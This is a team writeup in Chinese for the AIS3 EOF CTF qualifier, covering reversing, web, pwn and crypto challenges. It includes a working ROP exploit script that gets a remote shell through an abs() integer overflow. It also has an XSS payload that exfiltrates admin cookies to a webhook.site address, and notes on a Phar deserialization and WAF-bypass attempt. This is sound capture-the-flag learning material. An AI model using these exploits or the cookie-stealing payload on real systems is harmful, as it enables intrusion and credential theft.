# AIS3 EOF CTF Qual, Team: K0reanF15h Writeup
Ranking: 21/82 (14/75 if 7 TA teams is deducted)

###### tags: `CTF` `Writeup`
## Solved problems
### Ponzi Scheme(misc,68 solved,145 pts) 林宸慶
*    此題是一個投資系統，一開始有一千塊，可以選擇投資時間，依據投資時間不同回饋不同的金額，當擁有金額超過10000塊時可以取得flag。但是如果在投資時間到時，銀行沒有足夠的錢給你的話，則會使你破產，一塊錢都拿不到。
![](https://i.imgur.com/zTzFtP4.png)

*    解題步驟
1.先辦理一個主帳戶作為取得10000原之帳戶
2.辦理20個帳戶作為犧牲用帳號(錢投進去給主帳號拿)
```python
import hashlib
import time
import sys
import requests
from urllib import parse
import time
import urllib3


url = "http://eductf.zoolab.org:17385/"
def is_valid(digest):
    if sys.version_info.major == 2:
        digest = [ord(i) for i in digest]
    bits = ''.join(bin(i)[2:].zfill(8) for i in digest)
    return bits[:difficulty] == zeros

def getaccount():
    session = requests.session()
    response = session.get(url)
    index = response.text.find("<code>")
    prefix = response.text[index+6:index+28]
    ans = proof(prefix)
    print(prefix)
    response = session.get(url,params={"answer":ans})
    return response

def proof(prefix):
    difficulty = 22
    zeros = '0' * difficulty
    i = 0
    while True:
        i += 1
        s = prefix + str(i)
        if is_valid(hashlib.sha256(s.encode()).digest()):
            return i
account = []
for _ in range(20):
    start = time.time()
    res = getaccount()    
    account.append(res.url)
    end = time.time()
    print(res.url)
    if(end-start < 70):
        time.sleep(70-(end-start))
print(account)
```
3.主帳號 選擇投資3 30分鐘後取得10000元，並在主帳號投資後，犧牲用帳號在過了1797秒後將金額投入(確保主帳號有錢領出)，領出後可得FLAG
![](https://i.imgur.com/x7oa3bj.png)
![](https://i.imgur.com/9KwEftS.png)

### PokemonGo(reverse) 范航熏
1. 題目給了一個 GO program運行時的trace, 但包含了system function的trace 所以有很多跟原本main程式邏輯無關的trace, 多達1萬多行, 利用以下程式簡化
```python=
with open("./log") as f:
    cont = f.read()
f = open("./temp", "w+")
lines = cont.split("\n")
lines = lines[7389:]
skip = False
for line in lines:
    if "Entering fmt.Println" in line:
        skip = True
    elif "Entering fmt.Scanf" in line:
        skip = True
    elif "Leaving fmt.Println" in line:
        skip = False
        continue
    elif "Leaving fmt.Scanf" in line:
        skip = False
        continue
    if skip:
        continue
    f.write(line+'\n')
f.close()

```
2. 由PikaCheck 這個function 可以看到它把長度為20的輸入, 先將相鄰的兩個element相加, 形成新的array, 之後在一個byte一個byte跟固定的常數相減, 並把全部相減的結果相加, 若為總和為0則是對的
3. 因此由固定的常數, 加上猜測第一個element是在 A-Z0-9a-z之間, 就可以決定出正確的密碼是 `PikAPikApikaPikap1Ka`

### YugiMuto(reverse) 范航熏
1. 題目給一個Gameboy ROM, 利用BGB debugger開啟, 可以看到這個程式要求輸入一串密碼, 輸入錯誤會顯示 no no no 的畫面
2. 閱讀Gameboy CPU manual和反組譯後的指令, 發現畫面改變的function是在 0x1619開始, 會根據 bc register丄存的值, 一個tile一個tile修改VRAM上的tile number, 因此bc register尚存的記憶體位即是要顯示的畫面; 再往前看, 發現位於0x15f4的function會修改bc register的值(根據stack上的資料)再呼叫call 0x1619, 因此我們只要找到它是在哪邊 call 0x15f4, 那附近就是判斷輸入是否正確的code
3. 再找到輸入正確時顯示的畫面是存在0xc4c8之後, 就發現附近有檢查輸入是否正確的function在 0x0e61
4. 追蹤0x0e61的function, 發現他的行為是把輸入字串對應的tile number, 和固定值 `0x10 0x09 0x0e 0x1a 0x08 0x10 0x05 0x1a 0x20 0x16 0x02 0x13 0x06 0x08 0x02 0x0e 0x23 0x03 0x20 0x1a`
5. 從VRAM table找到對應的字元是 `OHMYGODY0UAREGAM3B0Y`

### impossible(pwn) 范航熏
1. 由source code可以看到, local buffer 讀的長度是由使用者輸入的, 但長度無法超過0x100, 因此無法buffer overflow
2. 當輸入的長度為負數時, 會經過 abs這個function做 2's complement轉成正數, 利用2補數的負為限制, 當輸入的len為 int所能表示的最大複數時 (0x80000000), abs(0x80000000abs(0x80000000), 而 0x80000000在輸入給read實會被當成正數, 因此可以觸發buffer overflow
3. 利用buffer overflow 修改return address來觸發ROP
```python=
r = remote('eductf.zoolab.org', 10105)
l = ELF('./libc-2.27.so')

got_puts = 0x4005b0
got_libc_start_main = 0x600ff0
main = 0x400748

pop_rdi = 0x400873


payload = flat(
        'a' * 0x100,
        0x400810,
        pop_rdi,
        got_libc_start_main,
        got_puts,
        main
        )

r.sendlineafter(': ', str(0x80000000))
r.sendafter(':)\n', payload)

libc_base = u64(r.recv(6) + '\0\0') - 0x21ab0
success(hex(libc_base))
l.address = libc_base


pop_rdx = libc_base + 0x1b96
pop_rsi = libc_base + 0x23e6a
pop_rax = libc_base + 0x439c8
syscall = libc_base + 0x13c0

payload = flat(
        'a' * 0x100,
        0x400810,
        pop_rdi,
        l.search('/bin/sh').next(),
        pop_rdx,
        0,
        pop_rsi,
        0,
        pop_rax,
        0x3b,
        syscall
        )

r.sendlineafter(': ', str(0x80000000))
r.sendafter(':)\n', payload)

r.interactive()

```

4. 拿到shell之後即可取得 `FLAG{H0w_did_y0u_byp4ss_my_ch3cking?_I7s_imp0ss1b1e!}`

### how2meow(web) 林宸慶、黃楚翔、胡安鳳 (20 solved, 251 pts)
*    此題的目標是要偷出admin的 cookie，可以觀察到，網站提供了一個上傳檔案的地方和一個可以被xss攻擊的網頁。

1.先觀察可以被攻擊的網頁(meow.php)，可以看到網站回應的header有做限制，因為這個限制，inline javascript 完全無法使用，且若要使用javascript，必須是同個網域內的，因此，另一個上傳檔案的地方成了我們的目標。
![](https://i.imgur.com/KPssHgp.png)
2.觀察上傳網站的source code，可以看到上傳要求的檔案是zip檔，且解壓縮後要有一個叫做meow的檔案，檔案內容為edu-ctf。
![](https://i.imgur.com/36krOtj.png)
3.但是我們要上傳的檔案需要是合法的 js 檔，但是我們只能上傳zip檔(須改副檔名為meow)，因此，我們將寫好的meow檔(edu-ctf)壓縮後得到一個zip檔，將此zip檔的附檔名改為meow。這樣便可以獲得一個合法的壓縮檔。接著我們在把壓縮檔的第一行加兩個斜槓，這樣javascript便會將這裡視為註解，之後再把我們的payload放進去，這樣這個檔案既是一個合法的meow檔，又是一個合法的js檔。
![](https://i.imgur.com/7bsfXek.png)
4.因為有 content security policy 的限制，只有 img 可以訪問外面的網站，所以將cookie附在src的上面傳出去作為payload。
```
payload = var img=document.createElement("img");img.src="http://webhook.site/36768177-3c9c-4c99-b2f4-4b300ec6f12a/?x="+btoa(document.cookie);
```
5.成功上傳這個檔案後，將meow.php裡 q參數設為script標籤並引用我們上傳的script檔，即可取得cookie
6.回報給admin可取得`FLAG{u_r_m3ow_xss_m4ster}`

### h0w(reverse) 胡安鳳 (29 solves, 209 pts)

1. 先反向編譯拿到的python bytecode (pyc檔案)
```python=
# uncompyle6 version 3.6.2
# Python bytecode 3.7 (3394)
# Decompiled from: Python 3.6.7 (default, Oct 22 2018, 11:32:17) 
# [GCC 8.2.0]
# Embedded file name: H0W.py
# Size of source mod 2**32: 387 bytes
import sys, struct
from terrynini import *
if len(sys.argv) != 2:
    print('Usage: python3 H0W.py filename')
    exit(0)
nini3()
f = open(sys.argv[1], 'rb').read()
if len(f) % 4 != 0:
    f += (4 - len(f) % 4) * '\x00'
nini1()
nini4()
for i in range(0, len(f), 4):
    nini6(nini5(struct.unpack('<i', f[i:i + 4])[0]))

for i in list(map(ord, nini2())):
    nini6(i)

print('Complete')
# okay decompiling H0W.pyc
```
2. 發現他援引 terynini這個shared object file, 其中 `nini6` `nini5` 感覺是比較重要的函數，所以用 IDA Pro 打開看看
3. 分析一下， nini6 感覺會是要最後寫出完整flag的函數，nini5也會有回傳重要的東西以及吃參數，其他函數則相對不要緊 
![](https://i.imgur.com/mm5xjzA.png)
![](https://i.imgur.com/bphqSaX.png)
4. 其中nini5還會呼叫這個function table
![](https://i.imgur.com/qJUCM4e.png)
分別是
* 將輸入整數作 $\oplus 0 \times FACEB00C$
* 將輸入整數作 $+ 74628$
* 將輸入整數作 bitwise $\&$, $|$, 位元旋轉
* 將輸入整數作以上三種運算各一次。
5. 在 output 最後洩漏了可能的時間資訊 ![](https://i.imgur.com/LMecdKH.png)
`2019 年 9 月?周星期三 05:25:14`
6. 將 `output.txt` 依照以上的函數，每次取binary file中 int長度的資料反著做回去即可
7. 解法如 `h0w/solve.c`
8. 最後拿到一張處理過的PNG檔（用xxd看檔案描述），打開後有 `FLAG{H3Y_U_C4NT_CHiLL_H3R3}`

### babyRMI(web) 黃楚翔

應該是簽到題，剛好這學期有修作業系統，對於RPC類的略懂略懂，從`RMIInterface.java`
```java=
// Every remote object sholud implement this interface
public interface RMIInterface extends Remote {
        String sayHello() throws RemoteException;
        String getSecret() throws RemoteException;
}
```
所以改成 `lookup("FLAG")`，再用 method `getSecret()`送過去就可以了
```java=
RMIInterface stub = (RMIInterface) registry.lookup("FLAG");
String response = stub.getSecret();
```

```shell=
❯ sh ./runClient.sh
response: \
FLAG{java_registry_is_important_to_rmi_deserialization_vulnerability!}
```
> 其實我還是不知道這題的 JAVA RMI deserialization vulnerability 在哪


## Unsolved, but tried
![](https://i.imgur.com/MlKYTxO.png)

### rsactr(crypto) 林宸慶、胡安鳳 (unsolved)

1. 在三次的操作，我們會得到公鑰、密文、以及可以嘗試的明文輸入作加密(洩漏nonce)
2. 這題想了非常久，起初想嘗試許多跟數學相關的RSA攻擊，諸如 [此連結的攻擊手法](https://www.slideshare.net/ssuseraba268/rsa-in-ctf)，但都沒有用(或者可能我就爛)
3. 重新研究程式碼，發現他是一種Block Cipher的加密模式，採用一個 $nonce$ 作為初始向量 $IV$ 接著擷取16bytes(128bit) 作區塊加密(每一塊長度均為16位元)
```python
if self.mode == self.MODE_CTR:
n, d = self.key
blocksize = 16
cipher = b''
for i in range(0, len(plain), blocksize):
    x = self.nonce
    y = pow(x, d, n)
    z = (y + bytes_to_long(plain[i:i+blocksize])) % n
    cipher += z.to_bytes(128, 'big')
    self.nonce += 2020 # 2020 happy new year

print('final cipher', bytes_to_long(cipher))
```
5. 加密方法為RSA， 公鑰$(N, e)$ 私鑰 $(N, d)$ $Cipher_{Blocki} = nonce^{d}\%N + Plain_{Blocki}$ 
6. 要解出 Nonce 並不難，採用RSA對稱的觀念，以私鑰加密的東西依樣也可以用公鑰解開，所以輸入一個 `\x00 * 16`的cipher讓他加密(plain 是 0 所以不影響)，則 $nonce = cipher^{e}\%N$
7. 但這僅僅解出nonce而已，真正最關鍵的$d$解不出來，有想到一組方程式
$$y1 = nonce^d\%n \\ y2 = (nonce + 2020)^d\%n \\ y3 = (nonce + 4040)^d\%n \\ ...$$
8. 但上述的方程式組應該解不出來，因為有 $%N$，如果RSA真的這麼簡單，那麼它的安全性會大大降低，所以 **我們認為一定有其他方法可以不需要d就能解這題**，但還沒想到 $Nonce$ 在每一次區塊運算完成後，都會 `+=2020`會是比較難處理的地方


### King of PHP (web) 黃楚翔 (unsolved)

#### Phpinfo info

PHP版本是7.4.3, openbase_dir沒有限制, disable function也為空

其中有開啟FFI, opcache.preload：/var/www/html/preload.php

於是訪問了`https://eductf.zoolab.org:28443/?f=/var/www/preload.php`, 得到了

```php=
<?php
class InitialOperation {
    private $path = "/tmp/*";
    function __destruct() {
        exec("rm ".$this->path); } }
    new InitialOperation();
```


所以整題的思路, 加上google大神告訴我這應該是: `file_get_contents` + Phar + PHP deserialization 的題目


#### Bypass WAF

`$_GET['c']`有濾掉`path`, 這裡我用 `?c[]=path...`處理, `$_GET['f']`會擋掉`phar://`, 這裡用'`compress.zlib://phar://`繞過去


#### Attempt

由上面兩項，我嘗試
1. 將`$path` overwrite 成 `;system([revershell code]);` 放到metadata, 這樣在`__destruct()`就會拿到shell
2. 用 `$_GET['c']` 把phar寫到server, 再用`$_GET['f']`觸發deserialization

但觀念應該有嚴重錯誤 :(

### VwVwVw(reverse) 范航熏
1. 這題用到會把輸入長度為24的input用SIMD做運算, 最後在跟固定的值做比較
2. 追蹤程式之後, 寫出模擬其驗證行為的程式

```python=
from os import *                                                                              
from math import *

def s2h(s):
    ret = []
    for i in range(len(s)):
        ret.append(ord(s[i]))
    return ret

def extend_flag(array):
    ret = []
    for i in range(32):
        if i < 16:
            ret.append(array[i])
        elif i < 28:
            ret.append(array[i - 4])
    
    ret.append(0x0)
    ret.append(0x53)
    ret.append(0x48)
    ret.append(0x45)
    return ret

def permute(array, p):
    ret = []
    for i in range(len(p)):
        if i < 16:
            ret.append(array[p[i] & 0xf])
        else:
            ret.append(array[(p[i] &0xf) + 16])

    return ret

def print_array(array):
    for i in range(len(array)):
        print(hex(array[i]))

def and_op(a1, a2):
    ret = []
    for i in range(len(a1)):
        ret.append(a1[i] & a2[i])
    return ret

def or_op(a1, a2):
    ret = []
    for i in range(len(a1)):
        ret.append(a1[i] | a2[i])
    return ret

def add_op(a1, a2):
    ret = []
    for i in range(len(a1)):
        ret.append((a1[i] + a2[i]) & 0xff)
    return ret

def xor_op(a1, a2):
    ret = []
    for i in range(len(a1)):
        ret.append(a1[i] ^ a2[i])
    return ret

def mul_op(a1, a2, mode):
    ret = []
    for i in range(len(a1)):
        if i % 2 == 0:
            val1 = 0
            val1 += (a1[i]/16) * pow(16, 1) + (a1[i]%16)
            val2 = 0
            val2 += (a2[i]/16) * pow(16, 1) + (a2[i]%16) 
        else:
            val1 += (a1[i]/16) * pow(16, 3) + (a1[i]%16) * pow(16, 2)
            val2 += (a2[i]/16) * pow(16, 3) + (a2[i]%16) * pow(16, 2)
            
            if mode == 1:   # upper
                result = int(val1 * val2) >> 16
            else:           # lower
                result = int(val1 * val2) & 0xffff

            r0 = int(result) & 0xff
            r1 = int(result) >> 8

            ret.append(int(r0))
            ret.append(int(r1))
    return ret

def shift_op(a1, m):
    ret = []
    for i in range(len(a1)):
        if i % 2 == 0:
            val1 = 0
            val1 += (a1[i]/16) * pow(16, 1) + (a1[i]%16)                                      
        else:
            val1 += (a1[i]/16) * pow(16, 3) + (a1[i]%16) * pow(16, 2)

            result = int(val1) >> m

            r0 = int(result) & 0xff
            r1 = int(result) >> 8

            ret.append(int(r0))
            ret.append(int(r1))
    return ret

target = [0x69, 0x7a, 0x12, 0x2d, 0x34,
            0x02, 0x28, 0x1a, 0x6a, 0x6e,
            0x0e, 0x01, 0x25, 0x13, 0x05,
            0x31, 0x6b, 0x57, 0x19, 0x21,
            0x26, 0x11, 0x16, 0x32, 0x69,
            0x6e, 0x2c, 0x26, 0x36, 0x3f,
            0x30, 0x20]

permute1 = [0x1, 0x0, 0x2, 0x1, 0x4, 0x3, 0x5, 0x4, 0x7, 0x6, 0x8, 0x7, 0xa, 0x9, 0xb, 
    0xa, 0x1, 0x0, 0x2, 0x1, 0x4, 0x3, 0x5, 0x4, 0x7, 0x6, 0x8, 0x7, 0xa, 0x9, 0xb, 0xa]

'''
tag = [1,1,1,1,1,0,0,0,0,0,
        0,0,0,0,0,0,0,0,0,0,
        0,0,0,0,0,0,0,1,1,1,
        1,1]
'''

tag = [1,1,1,1,1,0,0,0,0,0,
        0,0,0,0,0,0,0,0,0,0,
        0,0,0,0,0,0,0,0,0,0,
        0,0]

and1 = [0x00, 0xfc, 0xc0, 0x0f, 0x00, 0xfc, 0xc0, 0x0f,        
        0x00, 0xfc, 0xc0, 0x0f, 0x00, 0xfc, 0xc0, 0x0f,
        0x00, 0xfc, 0xc0, 0x0f, 0x00, 0xfc, 0xc0, 0x0f,
        0x00, 0xfc, 0xc0, 0x0f, 0x00, 0xfc, 0xc0, 0x0f]

and2 = [0xf0, 0x03, 0x3f, 0x00, 0xf0, 0x03, 0x3f, 0x00,
        0xf0, 0x03, 0x3f, 0x00, 0xf0, 0x03, 0x3f, 0x00,
        0xf0, 0x03, 0x3f, 0x00, 0xf0, 0x03, 0x3f, 0x00,
        0xf0, 0x03, 0x3f, 0x00, 0xf0, 0x03, 0x3f, 0x00]

mul1 = [0x40, 0x00, 0x00, 0x04, 0x40, 0x00, 0x00, 0x04,
        0x40, 0x00, 0x00, 0x04, 0x40, 0x00, 0x00, 0x04,
        0x40, 0x00, 0x00, 0x04, 0x40, 0x00, 0x00, 0x04,
        0x40, 0x00, 0x00, 0x04, 0x40, 0x00, 0x00, 0x04]

mul2 = [0x10, 0x00, 0x00, 0x01, 0x10, 0x00, 0x00, 0x01,
        0x10, 0x00, 0x00, 0x01, 0x10, 0x00, 0x00, 0x01,
        0x10, 0x00, 0x00, 0x01, 0x10, 0x00, 0x00, 0x01,
        0x10, 0x00, 0x00, 0x01, 0x10, 0x00, 0x00, 0x01,]                                      

and3 = [0x1e, 0x1e, 0x1e, 0x1e, 0x1e, 0x1e, 0x1e, 0x1e,
        0x1e, 0x1e, 0x1e, 0x1e, 0x1e, 0x1e, 0x1e, 0x1e,
        0x1e, 0x1e, 0x1e, 0x1e, 0x1e, 0x1e, 0x1e, 0x1e,
        0x1e, 0x1e, 0x1e, 0x1e, 0x1e, 0x1e, 0x1e, 0x1e]

const1 = [0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4, 0x4, 0x4, 0x8, 0x8, 
    0xc, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4, 0x4, 0x4, 0x8, 0x8, 0xc]

const2 = [0x41, 0x41, 0x47, 0x47, 0x41, 0x41, 0xfc, 0xfc, 0x47, 0x47, 0xfc, 0xfc, 0x47, 
    0x47, 0xed, 0xf0, 0x41, 0x41, 0x47, 0x47, 0x41, 0x41, 0xfc, 0xfc, 0x47, 0x47, 0xfc, 
    0xfc, 0x47, 0x47, 0xed, 0xf0] 


#arg0 = '/home/troy/NTU/Final_ctf/VwVwVw/verify'
arg0 = 'verify'
flag = 'FLAG{111111111111111111}'
#flag = '123456789012345678901111'
#flag = '2'*24


arg0_array = s2h(arg0)
flag_array = s2h(flag)


for i in range(len(flag_array)):
    flag_array[i] ^= arg0_array[i % len(arg0_array)]

flag_array_extend = extend_flag(flag_array)

flag_array_extend = permute(flag_array_extend, permute1)

for i in range(len(target)):
    target[i] = target[i] ^ arg0_array[i % len(arg0_array)]

#print_array(target)

flag_array_and1 = and_op(flag_array_extend, and1)
flag_array_and2 = and_op(flag_array_extend, and2)


flag_array_mul1 = mul_op(flag_array_and1, mul1, 1)
flag_array_mul2 = mul_op(flag_array_and2, mul2, 0)

flag_array_or = or_op(flag_array_mul1, flag_array_mul2)



# another function
flag_array_and3 = and_op(flag_array_or, and3)
flag_array_shift1 = shift_op(flag_array_and3, 1)

flag_permute = permute(const1, flag_array_shift1)

flag_array_xor = xor_op(flag_array_and3, flag_array_or)

flag_array_shift2 = shift_op(flag_array_xor, 4)

flag_array_or2 = or_op(flag_array_shift2, flag_array_xor)

flag_array_or3 = or_op(flag_array_or2, flag_permute)

flag_permute2 = permute(const2, flag_array_or3)

flag_array_add = add_op(flag_permute2, flag_array_or)

for i in range(32):
    flag_array_add[i] = flag_array_add[i] ^ arg0_array[i % len(arg0_array)]

print_array(flag_array_add)    

```

3. 雖然看懂程式行為, 但問題是它驗證前會先和 argv[0] (程式路徑) 做xor, 同樣的輸入不同的路徑會產生不同的結果, 因此在有兩個變因 (路徑和flag) 的情況下, 我很難回推出flag應該要是多少......
